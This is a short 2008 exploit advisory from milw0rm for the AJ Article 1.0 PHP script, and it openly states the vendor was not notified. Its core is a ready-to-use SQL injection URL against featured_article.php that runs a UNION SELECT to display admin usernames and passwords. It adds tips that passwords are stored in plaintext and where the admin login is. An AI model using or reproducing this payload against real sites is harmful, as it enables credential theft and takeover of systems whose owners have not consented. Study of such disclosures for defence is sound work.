@@ -1,0 +1,51 @@
+--==+================================================================================+==--
+--==+   AJ Article 1.0 (featured_article.php) Remote SQL Injection Vulnerability     +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 12 MAY 2008
+Script Download: http://www.ajsquare.com/products/article/index.php?auc=1
+DORK: N/A
+
+
+
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION: 
+
+AJ Article suffers from a insecure mysql query, This allows the
+remote attacker to arbitrary execute mysql code/querys.
+
+the below injection will perform a SELECT query which will display admin credentials in RED text.
+
+
+
+SQL Injection:
+
+http://site.com/featured_article.php?mode=detail&page=search&artid=-1/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,CONCAT(0x3C666F6E7420636F6C6F723D22726564223E,username,char(58),admin_password,0x3C2F666F6E743E),6,7,8,9,10,11,12/**/FROM/**/admin/*
+
+
+NOTE/TIP: 
+
+passwords are plaintext
+admin login is at "/admin/"
+
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+peace, t0pP8uZz
+
+
+
+--==+================================================================================+==--
+--==+   AJ Article 1.0 (featured_article.php) Remote SQL Injection Vulnerability     +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-05-12]
